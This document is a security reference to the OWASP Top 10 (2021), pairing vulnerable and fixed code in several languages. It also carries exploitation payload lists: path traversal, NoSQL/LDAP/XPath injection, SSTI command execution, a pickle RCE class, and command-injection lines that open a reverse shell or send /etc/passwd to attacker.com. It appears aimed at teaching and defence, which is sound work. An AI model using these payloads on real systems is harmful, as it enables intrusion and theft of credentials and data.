# OWASP Top 10 (2021) — Complete Deep Reference

## A01: Broken Access Control

**CWE Mapping**: CWE-22, CWE-284, CWE-285, CWE-639, CWE-862, CWE-863, CWE-732, CWE-425

### Sub-Categories

#### 1.1 Insecure Direct Object Reference (IDOR) / BOLA
**Description**: User-controlled object ID without authorization check.
**Detection**: Endpoints with `{id}` parameters lacking ownership verification.

```python
# BAD — No ownership check
@app.route("/api/order/<order_id>")
def get_order(order_id):
    return Order.query.get(order_id).to_dict()

# FIXED
@app.route("/api/order/<order_id>")
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)
    if order.user_id != current_user.id:
        abort(403)
    return order.to_dict()
```

**Language-specific tests**:
```javascript
// Node/Express — BAD
app.get('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    res.json(user);
});

// FIXED
app.get('/api/users/:id', authenticate, async (req, res) => {
    if (req.user.id !== req.params.id && req.user.role !== 'admin') {
        return res.status(403).json({ error: 'Forbidden' });
    }
    const user = await User.findById(req.params.id);
    res.json(user);
});
```

```java
// Spring Boot — BAD
@GetMapping("/api/orders/{id}")
public Order getOrder(@PathVariable Long id) {
    return orderRepository.findById(id).orElseThrow();
}

// FIXED
@GetMapping("/api/orders/{id}")
public Order getOrder(@PathVariable Long id, Principal principal) {
    Order order = orderRepository.findById(id).orElseThrow();
    if (!order.getUserId().equals(principal.getName())) {
        throw new AccessDeniedException("Forbidden");
    }
    return order;
}
```

```go
// Go — BAD
r.GET("/api/users/:id", func(c *gin.Context) {
    id := c.Param("id")
    var user User
    db.First(&user, id)
    c.JSON(200, user)
})

// FIXED
r.GET("/api/users/:id", authMiddleware(), func(c *gin.Context) {
    id := c.Param("id")
    currentUserID := c.GetString("user_id")
    if currentUserID != id && c.GetString("role") != "admin" {
        c.JSON(403, gin.H{"error": "forbidden"})
        return
    }
    var user User
    db.First(&user, id)
    c.JSON(200, user)
})
```

#### 1.2 Missing Function Level Access Control
**Description**: Admin endpoints accessible to regular users.
**Detection**: List all endpoints, check if admin-only routes lack role checks.

```python
# BAD — No role check on admin endpoint
@app.route("/admin/users")
@login_required
def admin_users():
    return User.query.all()

# FIXED
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_admin:
            abort(403)
        return f(*args, **kwargs)
    return decorated

@app.route("/admin/users")
@login_required
@admin_required
def admin_users():
    return User.query.all()
```

#### 1.3 Forced Browsing / Direct Access
**Description**: Accessing protected resources directly by URL.
**Detection**: Hidden endpoints, unprotected static files, direct file access.

**Common unprotected paths**:
```text
/admin, /admin/, /manager, /console, /actuator, /swagger-ui.html
/api-docs, /graphql, /private, /internal, /backup, /config
/.git/config, /.env, /robots.txt, /sitemap.xml, /wp-admin
```

**Exploitation**:
```bash
curl https://target.com/admin/
curl https://target.com/.git/config
curl https://target.com/backup/db_backup.sql
```

#### 1.4 CORS Misconfiguration
**Description**: Permissive CORS allowing cross-origin requests with credentials.
**Detection**: `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.

```python
# BAD
@app.after_request
def cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Credentials"] = "true"
    return response

# FIXED
@app.after_request
def cors(response):
    response.headers["Access-Control-Allow-Origin"] = "https://app.example.com"
    response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

#### 1.5 Path Traversal as Access Control Bypass
**See CWE-22 series in cwe-complete.md for full details.**

**Exploitation payloads**:
```text
../../../etc/passwd
..\\..\\..\\Windows\\System32\\config\\SAM
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/var/www/../../../etc/passwd
```

---

## A02: Cryptographic Failures

**CWE Mapping**: CWE-256, CWE-257, CWE-311, CWE-312, CWE-319, CWE-326, CWE-327, CWE-328

### Sub-Categories

#### 2.1 Weak Hashing Algorithms
**Detection**: MD5, SHA-1, SHA-224, RIPEMD-160 for security-sensitive hashing.

```python
# BAD
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()
password_hash = hashlib.sha1(password.encode()).hexdigest()

# FIXED
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Or using PBKDF2
import hashlib, secrets
salt = secrets.token_hex(16)
password_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
```

#### 2.2 Weak Encryption Algorithms
**Detection**: DES, 3DES, RC2, RC4, Blowfish (64-bit), AES-ECB.

```python
# BAD — DES
from Crypto.Cipher import DES
key = b'8bytekey'
cipher = DES.new(key, DES.MODE_ECB)

# BAD — AES-ECB (deterministic, pattern-leaking)
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)

# FIXED — AES-GCM (authenticated encryption)
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_GCM)
ciphertext, tag = cipher.encrypt_and_digest(data)
nonce = cipher.nonce
```

#### 2.3 Weak Key Sizes
**Detection**: RSA < 2048, DSA < 2048, DH < 2048, EC < 224.

```python
# BAD — 1024-bit RSA
from Crypto.PublicKey import RSA
key = RSA.generate(1024)

# FIXED — 4096-bit RSA
key = RSA.generate(4096)
```

#### 2.4 Cleartext Transmission
**Detection**: HTTP for sensitive content, missing HSTS.

```nginx
# BAD
server {
    listen 80;
    # No redirect to HTTPS
}

# FIXED
server {
    listen 80;
    return 301 https://$host$request_uri;
}
server {
    listen 443 ssl;
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";
}
```

#### 2.5 Cleartext Storage
**Detection**: Passwords, credit cards, PII stored unencrypted.

```python
# BAD
with open("users.json", "w") as f:
    json.dump({"password": password, "cc": credit_card}, f)

# FIXED (encrypt sensitive fields before storage)
from cryptography.fernet import Fernet
cipher = Fernet(key)
encrypted_cc = cipher.encrypt(credit_card.encode())
store(encrypted_cc)
```

#### 2.6 Weak Random Number Generators
**Detection**: Use of `random` module instead of `secrets` for security-sensitive operations.

```python
# BAD
import random
token = random.randint(0, 999999)
session_id = random.getrandbits(128)

# FIXED
import secrets
token = secrets.randbelow(1000000)
session_id = secrets.token_hex(32)
```

#### 2.7 TLS Configuration Weaknesses
**Detection**: TLS < 1.2, weak cipher suites, no forward secrecy.

```python
# BAD — Weak SSL context
import ssl
ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)  # TLS 1.0

# FIXED
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.minimum_version = ssl.TLSVersion.TLSv1_3
ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM')
```

#### 2.8 JWT Weaknesses
**Detection**: Algorithm confusion, `alg: none`, weak HMAC secret.

```python
# VULNERABLE
jwt.decode(token, algorithms=["none"])  # alg=none attack
jwt.decode(token, verify=False)         # No verification

# Algorithm confusion (RS256 public key used as HS256 secret)
jwt.decode(token, PUBLIC_KEY, algorithms=["HS256"])

# SECURE
jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"],
           audience="https://api.example.com",
           issuer="https://auth.example.com",
           options={"require": ["exp", "iat", "nbf"]})
```

---

## A03: Injection

**CWE Mapping**: CWE-77, CWE-78, CWE-89, CWE-90, CWE-94, CWE-95, CWE-116, CWE-917, CWE-643

### Sub-Categories

#### 3.1 SQL Injection (Full Coverage)

**Types**:
| Type | Description | Example |
|---|---|---|
| In-band (Error-based) | Data returned in error messages | `' OR 1=1 --` |
| In-band (UNION) | Data extracted via UNION | `' UNION SELECT * FROM users --` |
| Blind (Boolean) | True/false response differences | `' AND '1'='1` |
| Blind (Time) | Time delay inference | `'; WAITFOR DELAY '0:0:5' --` |
| Out-of-band | DNS/HTTP exfiltration | `'; EXEC xp_dirtree '\\attacker.com\file' --` |
| Second-order | Payload stored, triggered later | Stored XSS-like SQLi |

**Language-specific detection**:

```python
# Django ORM — SAFE
User.objects.filter(username=user_input)  # Parameterized

# Django Raw — BAD
User.objects.raw(f"SELECT * FROM users WHERE id = {user_input}")

# SQLAlchemy — BAD
session.execute(text(f"SELECT * FROM users WHERE id = {user_input}"))

# SQLAlchemy — SAFE
session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_input})
```

```javascript
// Node/Sequelize — BAD
sequelize.query(`SELECT * FROM users WHERE id = ${userInput}`)

// Node/Sequelize — SAFE
sequelize.query('SELECT * FROM users WHERE id = ?', { replacements: [userInput] })

// Node/pg — SAFE
pool.query('SELECT * FROM users WHERE id = $1', [userInput])
```

```java
// JDBC — BAD
Statement stmt = conn.createStatement();
stmt.executeQuery("SELECT * FROM users WHERE id = " + userInput);

// JDBC — SAFE
PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
pstmt.setString(1, userInput);
```

```csharp
// ADO.NET — BAD
SqlCommand cmd = new SqlCommand($"SELECT * FROM users WHERE id = {userInput}", conn);

// ADO.NET — SAFE
SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE id = @id", conn);
cmd.Parameters.AddWithValue("@id", userInput);
```

```go
// database/sql — BAD
db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = '%s'", userInput))

// database/sql — SAFE
db.Query("SELECT * FROM users WHERE id = $1", userInput)
```

```ruby
# ActiveRecord — BAD
User.where("id = '#{user_input}'")

# ActiveRecord — SAFE
User.where("id = ?", user_input)
User.find_by(id: user_input)
```

```php
// PDO — BAD
$stmt = $pdo->query("SELECT * FROM users WHERE id = " . $userInput);

// PDO — SAFE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userInput]);
```

#### 3.2 NoSQL Injection

**MongoDB**:
```javascript
// BAD — NoSQL injection
db.collection('users').find({ username: userInput, password: passInput });

// Payload: { "$gt": "" } — matches any string
// Payload: { "$ne": "" } — matches anything not equal to empty

// SAFE — Use schema validation and type checking
if (typeof userInput !== 'string') throw new Error('Invalid input');
db.collection('users').find({ username: userInput, password: passInput });
```

**Exploitation payloads**:
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^a"}}
{"$where": "this.password.length > 0"}
```

#### 3.3 LDAP Injection
```text
Payloads:
*)(uid=*
*)(|(uid=*))
*)(|(password=*))
admin)(&)
admin)(&(1=0
```

#### 3.4 XPath Injection
```text
Payloads:
' or '1'='1
' or ''='
' or 1=1 or '
admin' and string-length(password)=8 and '
```

#### 3.5 Template Injection (SSTI)

**Jinja2 (Python)**:
```python
# BAD
from jinja2 import Template
template = Template(user_input)
return template.render()

# SSTI payloads
{{ config }}
{{ self.__class__.__mro__[2].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**FreeMarker (Java)**:
```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

**Twig (PHP)**:
```text
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
{{ ['id'] | filter('system') }}
```

**Velocity (Java)**:
```text
#set($x='')##
#set($rt=$class.class.forName('java.lang.Runtime'))
#set($chr=$class.class.forName('java.lang.Character'))
#set($str=$class.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

#### 3.6 Command Injection

**Detection by language**:

```python
# BAD
os.system(f"ping {user_input}")
subprocess.call(f"grep {user_input} file", shell=True)
subprocess.Popen(f"cat {user_input}", shell=True)

# SAFE
subprocess.run(["ping", user_input])  # Array form
subprocess.run(["grep", user_input, "file"])
```

```javascript
// BAD
const { exec } = require('child_process');
exec(`grep ${userInput} file`);

// SAFE
const { execFile } = require('child_process');
execFile('grep', [userInput, 'file']);
```

```php
// BAD
shell_exec("grep " . $userInput . " file");
exec("grep " . $userInput . " file", $output);
system("grep " . $userInput . " file");

// SAFE
$input = escapeshellarg($userInput);
shell_exec("grep " . $input . " file");
```

```java
// BAD
Runtime.getRuntime().exec("grep " + userInput + " file");

// SAFE
ProcessBuilder pb = new ProcessBuilder("grep", userInput, "file");
```

```go
// BAD
cmd := exec.Command("sh", "-c", fmt.Sprintf("grep %s file", userInput))

// SAFE
cmd := exec.Command("grep", userInput, "file")
```

**Command injection payloads**:
```text
; id
| id
` id `
$(id)
|| id
&& id
; ls -la /
| nc attacker.com 4444 -e /bin/sh
; curl http://attacker.com/exfil?data=$(cat /etc/passwd)
```

#### 3.7 Code Injection (Eval-like)

**Per language dangerous functions**:

| Language | Dangerous Functions |
|---|---|
| Python | `eval()`, `exec()`, `compile()`, `execfile()` |
| JavaScript | `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)` |
| PHP | `eval()`, `assert()`, `preg_replace('/e')`, `create_function()` |
| Ruby | `eval()`, `instance_eval()`, `class_eval()`, `send()` |
| Java | `ScriptEngine.eval()`, `Method.invoke()` |
| C# | `CSharpCodeProvider`, `Eval()` |
| Lua | `load()`, `loadstring()` |

```python
eval("__import__('os').system('id')")
exec("import os; os.system('id')")
compile("print(1+1)", "<string>", "exec")
```

---

## A04: Insecure Design

**CWE Mapping**: CWE-73, CWE-183, CWE-209, CWE-213, CWE-362, CWE-441

### Sub-Categories

#### 4.1 Missing Rate Limiting
**Detection**: Auth endpoints without throttling.

```python
# BAD — No rate limiting
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    user = authenticate(username, password)
    return {"status": "ok" if user else "fail"}

# FIXED
from flask_limiter import Limiter
limiter = Limiter(key_func=lambda: request.remote_addr)

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute", "10 per hour")
def login():
    username = request.form["username"]
    password = request.form["password"]
    user = authenticate(username, password)
    return {"status": "ok" if user else "fail"}
```

#### 4.2 Client-Side Trust
**Detection**: Security decisions based on client-provided data (price, quantity, role).

```python
# BAD — Trusts client input for price
@app.route("/checkout", methods=["POST"])
def checkout():
    total = request.json["total"]  # Client says how much to pay
    charge_client(total)
    return {"status": "ok"}

# FIXED — Server calculates total
@app.route("/checkout", methods=["POST"])
def checkout():
    cart = get_cart(current_user.id)
    total = calculate_total(cart)
    charge_client(total)
    return {"status": "ok"}
```

#### 4.3 Weak Workflow Validation
**Detection**: Multi-step process without state validation.

**Example — Coupon code abuse**:
```python
# BAD — Can apply same coupon multiple times
@app.route("/apply-coupon", methods=["POST"])
def apply_coupon():
    coupon = Coupon.query.filter_by(code=request.json["code"]).first()
    if coupon and not coupon.expired:
        cart.apply_discount(coupon.discount)
        return {"discount": coupon.discount}

# FIXED — Check if coupon already used
@app.route("/apply-coupon", methods=["POST"])
def apply_coupon():
    coupon = Coupon.query.filter_by(code=request.json["code"]).first()
    if not coupon or coupon.expired:
        return {"error": "Invalid coupon"}, 400
    if coupon.used_by == current_user.id:
        return {"error": "Already used"}, 400
    coupon.used_by = current_user.id
    cart.apply_discount(coupon.discount)
    return {"discount": coupon.discount}
```

#### 4.4 Account Recovery Weaknesses
**Detection**: Weak security questions, predictable recovery tokens.

```python
# BAD — Predictable recovery token
import hashlib
token = hashlib.md5(f"{user_id}:{timestamp}".encode()).hexdigest()

# FIXED
import secrets
token = secrets.token_urlsafe(32)
store_recovery_token(user_id, token, expires_in=3600)
send_email(user.email, f"Reset: https://example.com/reset?token={token}")
```

#### 4.5 Missing MFA
**Detection**: Sensitive operations without multi-factor authentication.

**Checklist**:
- Admin panel access
- Password change
- Money transfer
- API key generation
- Account settings changes

---

## A05: Security Misconfiguration

**CWE Mapping**: CWE-16, CWE-209, CWE-215, CWE-260, CWE-315, CWE-520, CWE-526

### Sub-Categories

#### 5.1 Debug Mode Enabled
```python
# BAD
app.run(debug=True)  # In production!

# FIXED
app.run(debug=os.environ.get("DEBUG", "0") == "1")
```

#### 5.2 Directory Listing Enabled
```nginx
# BAD
server {
    location / {
        root /var/www/html;
        autoindex on;  # Lists all files
    }
}

# FIXED
server {
    location / {
        root /var/www/html;
        autoindex off;
    }
}
```

#### 5.3 Verbose Error Messages
```python
# BAD
app.config["PROPAGATE_EXCEPTIONS"] = True  # Shows stack traces in production

# FIXED
@app.errorhandler(500)
def handle_error(e):
    return {"error": "Internal server error"}, 500
```

#### 5.4 Unnecessary HTTP Methods
**Detection**: OPTIONS shows PUT, DELETE, TRACE, CONNECT enabled.

```bash
curl -X OPTIONS https://target.com/api/ -v
```

**Fix**:
```nginx
if ($request_method !~ ^(GET|POST|HEAD)$) {
    return 405;
}
```

#### 5.5 Server Version Disclosure
```nginx
# BAD
# Server: nginx/1.20.1

# FIXED
server_tokens off;
```

#### 5.6 Security Headers Missing

Full required header set:
```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

**Detection by language**:

```python
# Flask
@app.after_request
def add_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    response.headers["Strict-Transport-Security"] = "max-age=63072000"
    return response

# Django (settings.py)
SECURE_HSTS_SECONDS = 63072000
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_BROWSER_XSS_FILTER = True
X_FRAME_OPTIONS = 'DENY'
CSRF_COOKIE_SECURE = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
```

#### 5.7 Default Credentials
**Detection**: Common default usernames and passwords.

```text
admin/admin, admin/password, admin/1234, admin/admin123
root/root, root/toor, root/123456
user/user, guest/guest, test/test
```

#### 5.8 Cloud Storage Misconfiguration
**Detection**: Publicly accessible S3 buckets, Azure Blob containers.

```bash
# AWS S3 bucket enumeration
curl https://{bucket-name}.s3.amazonaws.com/
curl https://s3.amazonaws.com/{bucket-name}/
aws s3 ls s3://{bucket-name} --no-sign-request
```

#### 5.9 Kubernetes Misconfiguration
**Detection**: Privileged containers, hostNetwork, hostPID, hostPath mounts.

```yaml
# BAD — Privileged container
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    image: app:latest
    securityContext:
      privileged: true
      runAsUser: 0
      capabilities:
        add: ["SYS_ADMIN", "NET_ADMIN"]

# FIXED
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: app:latest
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
      readOnlyRootFilesystem: true
```

---

## A06: Vulnerable & Outdated Components

**CWE Mapping**: CWE-937, CWE-1035, CWE-1104

### Sub-Categories

#### 6.1 Dependency Scanning
**Tool-specific commands**:
```bash
# npm
npm audit
npm audit --json

# pip
pip-audit
safety check

# Maven
mvn dependency-check:check

# Gradle
gradle dependencyCheckAnalyze

# Go
govulncheck ./...

# Rust
cargo audit

# .NET
dotnet list package --vulnerable
```

#### 6.2 Known Vulnerable Patterns
**Detection**: Specific vulnerable library versions.

```json
// package.json — vulnerable versions
"lodash": "<4.17.21",         // Prototype pollution
"express": "<4.18.0",        // Open redirect
"axios": "<1.6.0",           // SSRF
"jsonwebtoken": "<9.0.0",    // RCE
"node-fetch": "<3.3.1",      // URL parsing issue
"moment": "<2.29.4",         // ReDoS
"passport": "<0.6.0",        // Session injection
"bootstrap": "<4.0.0",       // XSS
"jquery": "<3.5.0",          // XSS
```

#### 6.3 End-of-Life Runtimes
**Detection**:
- Node.js < 18.x (EOL April 2025)
- Python 2.7 (EOL Jan 2020)
- Java 8 (EOL March 2022)
- .NET Framework < 4.8
- Ruby 2.7 (EOL March 2023)
- PHP < 8.0

#### 6.4 Typo-Squatting Detection
**Common typo-squatted packages**:
```text
urllib3 → urllib, urlib3, urlllib3
requests → request, reqests, requets
colorama → collorama, coloramma
numpy → nummpy, numpy
pandas → pands, pandars
lodash → lodash, lodash-es
```

**Detection regex**:
```python
TYPOSQUAT_PATTERNS = [
    r'(?i)^(requets|request|reqeust|reques)$',
    r'(?i)^(colorama|colourama)$',
    r'(?i)^(numpy|numm?py)$',
    r'(?i)^(pands|panda[sr])$',
    r'(?i)^(lodash|lodash-es)$',
]
```

---

## A07: Identification & Authentication Failures

**CWE Mapping**: CWE-255, CWE-259, CWE-287, CWE-288, CWE-290, CWE-306, CWE-307, CWE-308, CWE-521, CWE-613, CWE-640, CWE-798

### Sub-Categories

#### 7.1 Weak Password Policy
**Requirements**:
```python
def validate_password(password):
    if len(password) < 12:
        return "Password must be at least 12 characters"
    if not re.search(r"[A-Z]", password):
        return "Password must contain uppercase letter"
    if not re.search(r"[a-z]", password):
        return "Password must contain lowercase letter"
    if not re.search(r"\d", password):
        return "Password must contain digit"
    if not re.search(r"[!@#$%^&*(),.?\":{}|<>]", password):
        return "Password must contain special character"
    if password.lower() in COMMON_PASSWORDS:
        return "Password is too common"
    return None
```

#### 7.2 Credential Stuffing Protection
**Detection**: No rate limiting, no device fingerprinting on login.

**Protection strategies**:
- Rate limiting by IP, user, and device fingerprint
- CAPTCHA after N failed attempts
- Account lockout after threshold
- Device profiling and anomaly detection
- Breached password detection (haveibeenpwned API)

#### 7.3 Session Management Flaws

**Session Fixation**:
```python
# BAD — Session ID not rotated on login
@app.route("/login", methods=["POST"])
def login():
    user = authenticate(request.form["username"], request.form["password"])
    if user:
        session["user_id"] = user.id
    return redirect("/")

# FIXED — Session ID rotated
@app.route("/login", methods=["POST"])
def login():
    user = authenticate(request.form["username"], request.form["password"])
    if user:
        session.regenerate()  # New session ID
        session["user_id"] = user.id
    return redirect("/")
```

**Session Expiration**:
```python
# BAD — Session never expires
app.config["PERMANENT_SESSION_LIFETIME"] = None  # Never

# FIXED
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=2)
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SECURE"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
```

#### 7.4 Weak Password Recovery
**Detection**: Predictable tokens, no rate limiting on reset, enumeration.

```python
# BAD — Predictable token
token = user_id * 1337  # Predictable

# BAD — User enumeration in recovery
if user_exists(email):
    send_reset_email(email)
    return {"message": "Email sent"}
else:
    return {"error": "User not found"}, 404

# FIXED — Same response regardless
send_reset_email(email)  # Always attempt to send
return {"message": "If account exists, email sent"}
```

#### 7.5 JWT Security Checklist

| Issue | Detection | Fix |
|---|---|---|
| `alg: none` | JWT with `alg: "none"` | Reject tokens with `none` algorithm |
| Weak HMAC secret | `secret` as secret | Use 256+ bit random secret |
| Algorithm confusion | Public key used as HMAC secret | Restrict algorithm list |
| Token not expired | Missing `exp` claim | Always validate `exp` |
| Token stolen | No `jti` or revocation list | Implement token blacklist |
| Missing audience | No `aud` check | Validate `aud` claim |
| Missing issuer | No `iss` check | Validate `iss` claim |

```python
# SECURE JWT configuration
def verify_jwt(token):
    try:
        payload = jwt.decode(
            token,
            PUBLIC_KEY,
            algorithms=["RS256"],
            audience="https://api.example.com",
            issuer="https://auth.example.com",
            options={
                "require": ["exp", "iat", "nbf", "aud", "iss"],
                "verify_exp": True,
                "verify_iat": True,
                "verify_nbf": True,
            }
        )
        if payload.get("jti") in revoked_tokens:
            raise jwt.InvalidTokenError("Token revoked")
        return payload
    except jwt.InvalidTokenError as e:
        return None
```

---

## A08: Software & Data Integrity Failures

**CWE Mapping**: CWE-345, CWE-353, CWE-426, CWE-494, CWE-502, CWE-565, CWE-784, CWE-829

### Sub-Categories

#### 8.1 Insecure Deserialization

**Language-specific exploitation**:

**Python pickle**:
```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id",))

pickle.dumps(Exploit())  # Serialized payload
pickle.loads(payload)    # Triggers os.system("id") — RCE!
```

**Java deserialization**:
```java
// BAD
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("data.ser"));
Object obj = ois.readObject();  // RCE if data is malicious

// Detection: ObjectInputStream, readObject, readUnshared
```

**.NET BinaryFormatter**:
```csharp
// BAD
BinaryFormatter formatter = new BinaryFormatter();
MemoryStream stream = new MemoryStream(data);
object obj = formatter.Deserialize(stream);  // RCE

// Detection: BinaryFormatter, LosFormatter, SoapFormatter, NetDataContractSerializer
```

**PHP unserialize**:
```php
// BAD
$data = unserialize($userInput);  // RCE via __wakeup or __destruct gadgets

// Detection: unserialize() with user input
// SAFE: json_decode()
```

**Ruby Marshal**:
```ruby
# BAD
data = Marshal.load(user_input)  # RCE

# SAFE
data = JSON.parse(user_input)
```

**Node.js serialize**:
```javascript
// node-serialize
var serialize = require('node-serialize');
var data = serialize.unserialize(userInput);  // RCE via IIFE

// Payload: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(){})}()"}
```

#### 8.2 Supply Chain Attacks

**Detection areas**:
- Direct npm/pip/packagist dependencies
- Transitive dependencies (indirect)
- Build-time dependencies (CI/CD)
- Base container images
- CDN-loaded third-party scripts

**Fix — Subresource Integrity (SRI)**:
```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-abc123def456..."
        crossorigin="anonymous"></script>
```

**Fix — Dependency pinning**:
```text
# requirements.txt — PINNED
requests==2.31.0
cryptography==41.0.7

# BAD — Unpinned
requests>=2.0.0
cryptography
```

#### 8.3 Unsigned Updates
**Detection**: Updates downloaded without signature verification.

```python
# BAD — No signature verification
response = requests.get("https://updates.example.com/update.zip")
with open("update.zip", "wb") as f:
    f.write(response.content)

# FIXED — Verify signature
response = requests.get("https://updates.example.com/update.zip.sig")
signature = response.content
update = requests.get("https://updates.example.com/update.zip").content
if verify_signature(update, signature, PUBLIC_KEY):
    save_update(update)
```

#### 8.4 CI/CD Pipeline Integrity
**Detection**:
- No signed commits
- No branch protection
- Malicious PRs auto-merged
- Insecure CI secrets

---

## A09: Security Logging & Monitoring Failures

**CWE Mapping**: CWE-117, CWE-223, CWE-532, CWE-778

### Sub-Categories

#### 9.1 Insufficient Logging

**What should be logged**:
```python
import logging

logging.basicConfig(level=logging.INFO)

# Must-log events
logging.info(f"Login {'successful' if success else 'failed'} for user {username} from IP {ip}")
logging.info(f"Password change for user {user_id}")
logging.info(f"Admin action: {action} by user {admin_id}")
logging.warning(f"Rate limit exceeded for IP {ip} on endpoint {endpoint}")
logging.warning(f"Suspicious input detected: {input_truncated}")
logging.error(f"Authentication failure: {error}")
```

**What should NOT be logged**:
```python
# BAD — Logging sensitive data
logging.info(f"Password: {password}")
logging.info(f"Credit card: {cc_number}")
logging.info(f"Token: {jwt_token}")
logging.info(f"Session ID: {session_id}")
logging.info(f"PII: {ssn}, {dob}, {email}")

# FIXED — Mask sensitive data
logging.info(f"Password: {mask(password)}")
logging.info(f"Credit card: {mask(cc_number)}")
```

#### 9.2 Log Injection / Log Forging
**Description**: Attacker injects CRLF into log entries to forge logs.

```python
# BAD
logging.info(f"User input: {user_input}")
# If user_input = "benign\r\n[INFO] Authentication successful for user admin"

# FIXED
logging.info(f"User input: {sanitize_for_logs(user_input)}")

def sanitize_for_logs(s: str) -> str:
    return s.replace("\r", "").replace("\n", "").replace("\t", " ")
```

#### 9.3 Monitoring Deficiencies
**Checklist**:
- No alerts on multiple failed logins
- No alerts on privilege escalation
- No alerts on unusual data access patterns
- No alerts on account creation during off-hours
- No centralized SIEM integration
- No retention policy enforcement
- No log integrity/immutability

#### 9.4 Log Tampering
**Fix**: Centralized logging with append-only storage.

```bash
# Configure rsyslog to forward to remote syslog server
*.* @logserver.example.com:514
# Use immutable log storage (AWS S3 Object Lock, Azure Blob Immutable Storage)
```

---

## A10: Server-Side Request Forgery (SSRF)

**CWE Mapping**: CWE-918

### Sub-Categories

#### 10.1 Basic SSRF
**Description**: Server makes HTTP request to attacker-controlled URL.

```python
# BAD
@app.route("/fetch")
def fetch_url():
    url = request.args.get("url")
    resp = requests.get(url)
    return resp.text

# FIXED
from urllib.parse import urlparse

ALLOWED_DOMAINS = ["api.example.com"]
BLOCKED_IPS = ["169.254.169.254", "127.0.0.1", "10.", "172.16.", "192.168."]

@app.route("/fetch")
def fetch_url():
    url = request.args.get("url")
    parsed = urlparse(url)

    # Allowlist check
    if not any(domain in parsed.netloc for domain in ALLOWED_DOMAINS):
        return {"error": "Domain not allowed"}, 400

    # IP resolution check
    try:
        ip = socket.gethostbyname(parsed.netloc)
        if any(ip.startswith(blocked) for blocked in BLOCKED_IPS):
            return {"error": "URL not allowed"}, 400
    except socket.gaierror:
        return {"error": "Invalid host"}, 400

    resp = requests.get(url, timeout=5)
    return resp.text
```

#### 10.2 Blind SSRF
**Description**: SSRF without visible response body, but with outbound request.

**Detection techniques**:
```bash
# Use external collaborator (Burp Collaborator, interactsh, webhook.site)
# DNS-based exfiltration
curl http://attacker-controlled-domain.com/`hostname`.attacker.com
```

#### 10.3 SSRF to Cloud Metadata

**Cloud metadata endpoints**:
```text
AWS:      http://169.254.169.254/latest/meta-data/
AWS:      http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS:      http://169.254.169.254/latest/user-data/
GCP:      http://metadata.google.internal/computeMetadata/v1/
GCP:      http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Azure:    http://169.254.169.254/metadata/instance?api-version=2021-02-01
Azure:    http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
DigitalOcean: http://169.254.169.254/metadata/v1.json
Alibaba:  http://100.100.100.200/latest/meta-data/
